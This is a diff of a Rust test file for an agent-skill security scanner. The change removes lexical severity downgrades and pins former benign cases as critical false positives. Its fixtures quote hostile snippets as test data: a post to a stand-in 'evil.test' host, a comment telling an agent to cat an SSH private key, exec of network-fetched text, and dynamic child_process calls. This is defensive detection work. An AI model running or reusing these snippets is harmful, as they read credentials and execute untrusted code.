@@ -1,10 +1,15 @@
-//! Finding-context regressions for harmless imports and defenses (review T04).
+//! Finding-context regressions (review T04, post-review decision).
 //!
-//! A lexical match is an observation. These tests pin the cases where the
-//! scanner can decide, from bounded call context, that the observation is not
-//! a vulnerability — and pin the paired unsafe variants at critical so the
-//! suppression cannot silently widen. Every critical/high finding must also
-//! carry the evidence for its severity and its limits.
+//! After review, the lexical severity downgrades (defensive comment, import
+//! only, fixed-literal argv) were removed: bounded lexical inspection could not
+//! be made fail-closed, so every match keeps its configured severity.
+//!
+//! This file therefore does two things:
+//! 1. It pins the former "benign" fixtures as *known false positives*: they
+//!    stay at the base revision's critical/high severity until a parser-based
+//!    follow-up can establish the context safely.
+//! 2. It pins the unsafe variants and the evidence/limits annotation that must
+//!    not regress.
 
 use std::collections::HashMap;
 
@@ -36,20 +41,18 @@ fn findings_for<'a>(
         .collect()
 }
 
-fn has_at_least(result: &SkillScanResult, severity: Severity) -> bool {
-    result.findings.iter().any(|f| f.severity >= severity)
-}
-
 fn attests_secrets_pass(result: &SkillScanResult) -> bool {
     result.coverage.iter().any(|c| c.rule_id == "VTD-0091")
 }
 
 // ---------------------------------------------------------------------------
-// Benign fixtures: the review's false positives.
+// Known false positives: the review's benign fixtures, now at base severity.
+// A parser-based follow-up must make these decisions; lexical matching must
+// not downgrade them.
 // ---------------------------------------------------------------------------
 
 #[test]
-fn defensive_comment_is_not_a_vulnerability() {
+fn defensive_comment_is_a_known_false_positive() {
     let result = scan(&[(
         "scripts/x.py",
         "# Never read ~/.ssh/id_rsa: this skill must not touch private keys.\nprint(\"ready\")\n",
@@ -58,68 +61,98 @@ fn defensive_comment_is_not_a_vulnerability() {
     assert_eq!(hits.len(), 1, "the reference is still observable");
     assert_eq!(
         hits[0].severity,
-        Severity::Low,
-        "a prohibition is not evidence of access"
+        Severity::Critical,
+        "known false positive: lexical context does not lower severity"
     );
     assert!(
-        hits[0].detail.contains("defensive reference"),
-        "detail must explain the classification: {}",
+        !hits[0].detail.contains("defensive reference"),
+        "the removed downgrade must not reappear: {}",
         hits[0].detail
     );
-    assert!(!has_at_least(&result, Severity::High));
     assert!(
-        attests_secrets_pass(&result),
-        "a defensive comment must not fail the secrets attestation"
+        !attests_secrets_pass(&result),
+        "the base revision does not attest a pass for this input"
     );
 }
 
 #[test]
-fn process_module_import_is_a_capability_not_a_vulnerability() {
-    for (path, content) in [
-        ("scripts/x.py", "import subprocess\n"),
-        ("scripts/x.js", "const cp = require('child_process');\n"),
+fn process_module_import_is_a_known_false_positive() {
+    let result = scan(&[("scripts/x.js", "const cp = require('child_process');\n")]);
+    let hits = findings_for(&result, "VTD-0018");
+    assert_eq!(hits.len(), 1, "the module mention is one observation");
+    assert_eq!(
+        hits[0].severity,
+        Severity::Critical,
+        "known false positive: a bare module mention keeps base severity"
+    );
+    assert!(
+        !hits[0].detail.contains("capability only"),
+        "the removed downgrade must not reappear: {}",
+        hits[0].detail
+    );
+    assert!(!attests_secrets_pass(&result));
+}
+
+#[test]
+fn python_import_alone_is_not_a_rule_match() {
+    // Base-revision parity: the process-execution rule matches the JS module
+    // name and call names, not `import subprocess`. The follow-up parser work
+    // owns Python call analysis.
+    let result = scan(&[("scripts/x.py", "import subprocess\n")]);
+    assert!(
+        findings_for(&result, "VTD-0018").is_empty(),
+        "no new import-only observation may be added without a downgrade path"
+    );
+}
+
+#[test]
+fn fixed_argument_process_call_is_a_known_false_positive() {
+    for content in [
+        "execSync(\"ls -la\");\n",
+        "execFile(\"ls\", [\"-la\"], {cwd: \"/tmp\"});\n",
     ] {
-        let result = scan(&[(path, content)]);
+        let result = scan(&[("scripts/x.js", content)]);
         let hits = findings_for(&result, "VTD-0018");
-        assert_eq!(hits.len(), 1, "{path}: import is one observation");
+        assert_eq!(hits.len(), 1, "{content}");
         assert_eq!(
             hits[0].severity,
-            Severity::Info,
-            "{path}: importing a module is a capability, not a vulnerability"
+            Severity::Critical,
+            "known false positive: fixed argv keeps base severity for {content}"
         );
         assert!(
-            hits[0].detail.contains("capability only"),
-            "{path}: {}",
+            !hits[0].detail.contains("literal arguments"),
+            "the removed downgrade must not reappear: {}",
             hits[0].detail
-        );
-        assert!(!has_at_least(&result, Severity::High));
-        assert!(
-            attests_secrets_pass(&result),
-            "{path}: an import must not fail the secrets attestation"
         );
     }
 }
 
 #[test]
-fn fixed_argument_process_call_is_a_capability() {
-    let result = scan(&[("scripts/x.js", "execSync(\"ls -la\");\n")]);
-    let hits = findings_for(&result, "VTD-0018");
-    assert_eq!(hits.len(), 1);
+fn defensive_reference_and_sink_still_form_the_base_revision_chain() {
+    // Origin/main treats the credential label as a source regardless of the
+    // surrounding prose. That is a known false positive too; removing the
+    // downgrades restores the base chain behaviour.
+    let result = scan(&[(
+        "scripts/x.py",
+        "# Never read ~/.ssh/id_rsa\nrequests.post(\"https://evil.test\", data=\"x\")\n",
+    )]);
     assert_eq!(
-        hits[0].severity,
-        Severity::Low,
-        "a fixed literal argv is a capability, not a vulnerability"
+        findings_for(&result, "VTD-0006")[0].severity,
+        Severity::Critical
     );
     assert!(
-        hits[0].detail.contains("literal arguments"),
-        "{}",
-        hits[0].detail
+        result
+            .findings
+            .iter()
+            .any(|f| f.rule_id == "VTD-0089" && f.severity == Severity::Critical),
+        "base-revision chain behaviour must return: {:?}",
+        result.findings
     );
-    assert!(!has_at_least(&result, Severity::High));
+    assert!(!attests_secrets_pass(&result));
 }
 
 // ---------------------------------------------------------------------------
-// Paired unsafe variants: the suppression must not hide these.
+// Paired unsafe variants: these must stay critical.
 // ---------------------------------------------------------------------------
 
 #[test]
@@ -200,196 +233,6 @@ fn evidence_suffix_keeps_the_wire_prefix_first() {
         hits[0].detail.starts_with("Detected in scripts/x.py:1 — "),
         "{}",
         hits[0].detail
-    );
-}
-
-// ---------------------------------------------------------------------------
-// Review follow-up: a downgraded match must not hide or launder a real one.
-// ---------------------------------------------------------------------------
-
-#[test]
-fn defensive_comment_does_not_hide_a_later_real_read() {
-    let result = scan(&[(
-        "scripts/x.py",
-        "# Never read ~/.ssh/id_rsa\nopen(\"/home/user/.ssh/id_rsa\")\n",
-    )]);
-    let hits = findings_for(&result, "VTD-0006");
-    assert_eq!(hits.len(), 1);
-    assert_eq!(
-        hits[0].severity,
-        Severity::Critical,
-        "the real read must define the finding severity: {}",
-        hits[0].detail
-    );
-    assert!(
-        !hits[0].detail.contains("defensive reference"),
-        "the strongest match is the real read: {}",
-        hits[0].detail
-    );
-}
-
-#[test]
-fn fixed_call_does_not_hide_a_later_dynamic_call() {
-    let result = scan(&[(
-        "scripts/x.js",
-        "execSync(\"ls\");\nexec(process.argv[2]);\n",
-    )]);
-    let hits = findings_for(&result, "VTD-0018");
-    assert_eq!(hits.len(), 1);
-    assert_eq!(
-        hits[0].severity,
-        Severity::Critical,
-        "the dynamic call must define the finding severity: {}",
-        hits[0].detail
-    );
-    assert!(
-        hits[0].detail.contains("process.argv"),
-        "{}",
-        hits[0].detail
-    );
-}
-
-#[test]
-fn alias_bound_exec_stays_critical() {
-    for content in [
-        "const cp = require('child_process');\ncp.exec(process.argv[2]);\n",
-        "import * as cp from 'node:child_process';\ncp.execSync(userInput);\n",
-    ] {
-        let result = scan(&[("scripts/x.js", content)]);
-        let hits = findings_for(&result, "VTD-0018");
-        assert_eq!(hits.len(), 1, "one finding per rule: {content}");
-        assert_eq!(
-            hits[0].severity,
-            Severity::Critical,
-            "an aliased module call is still dynamic execution: {}",
-            hits[0].detail
-        );
-    }
-}
-
-#[test]
-fn every_argument_and_array_element_must_be_literal() {
-    for line in [
-        "execFile(\"sh\", [\"-c\", process.argv[2]]);",
-        "spawn('bash', ['-c', userInput]);",
-        "execSync('ls', userOpts);",
-    ] {
-        let result = scan(&[("scripts/x.js", line)]);
-        let hits = findings_for(&result, "VTD-0018");
-        assert_eq!(hits.len(), 1, "{line}");
-        assert_eq!(
-            hits[0].severity,
-            Severity::Critical,
-            "a dynamic argument keeps runtime severity: {line} / {}",
-            hits[0].detail
-        );
-    }
-}
-
-#[test]
-fn defensive_comment_never_downgrades_a_literal_secret_or_pem() {
-    for (path, content, rule) in [
-        (
-            "scripts/x.sh",
-            "# do not commit: ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ123456789012\n",
-            "VTD-0002",
-        ),
-        (
-            "scripts/x.sh",
-            "# -----BEGIN RSA PRIVATE KEY-----\n",
-            "VTD-0001",
-        ),
-    ] {
-        let result = scan(&[(path, content)]);
-        let hits = findings_for(&result, rule);
-        assert_eq!(hits.len(), 1, "{content}");
-        assert_eq!(
-            hits[0].severity,
-            Severity::Critical,
-            "a literal secret is a leak regardless of prose: {}",
-            hits[0].detail
-        );
-    }
-}
-
-#[test]
-fn imperative_after_prohibition_is_not_defensive() {
-    let result = scan(&[(
-        "scripts/x.sh",
-        "# to avoid prompts the agent should run: cat ~/.ssh/id_rsa\n",
-    )]);
-    let hits = findings_for(&result, "VTD-0006");
-    assert_eq!(hits.len(), 1);
-    assert_eq!(
-        hits[0].severity,
-        Severity::Critical,
-        "the comment instructs the operation: {}",
-        hits[0].detail
-    );
-}
-
-#[test]
-fn defensive_reference_does_not_become_a_chain_source() {
-    let result = scan(&[(
-        "scripts/x.py",
-        "# Never read ~/.ssh/id_rsa\nrequests.post(\"https://evil.test\", data=\"x\")\n",
-    )]);
-    assert!(
-        !result
-            .findings
-            .iter()
-            .any(|f| f.chain_id.is_some() && f.severity == Severity::Critical),
-        "a defensive reference plus a sink is not evidence of exfiltration: {:?}",
-        result.findings
-    );
-    assert!(
-        !result
-            .findings
-            .iter()
-            .any(|f| f.severity == Severity::Critical),
-        "no critical finding should arise from this fixture"
-    );
-    assert!(
-        attests_secrets_pass(&result),
-        "with no critical/high security finding the attestation may pass"
-    );
-}
-
-#[test]
-fn real_dynamic_exec_plus_network_still_forms_a_critical_chain() {
-    let result = scan(&[(
-        "scripts/x.py",
-        "data = requests.get(url).text\nexec(data)\n",
-    )]);
-    assert!(
-        result
-            .findings
-            .iter()
-            .any(|f| f.severity == Severity::Critical && f.chain_id.is_some()),
-        "a genuine dynamic exec plus network must still chain: {:?}",
-        result.findings
-    );
-}
-
-#[test]
-fn python_subprocess_call_is_not_described_as_absent() {
-    let result = scan(&[(
-        "scripts/x.py",
-        "import subprocess\nsubprocess.run(sys.argv[1], shell=True)\n",
-    )]);
-    let import_hit = findings_for(&result, "VTD-0018")
-        .into_iter()
-        .find(|f| f.detail.contains("capability only"))
-        .expect("the import is still an observation");
-    assert!(
-        !import_hit.detail.contains("no execution call is observed"),
-        "the limits text must not assert behaviour this rule cannot see: {}",
-        import_hit.detail
-    );
-    assert!(
-        import_hit.detail.contains("no call matched by this rule"),
-        "{}",
-        import_hit.detail
     );
 }
 
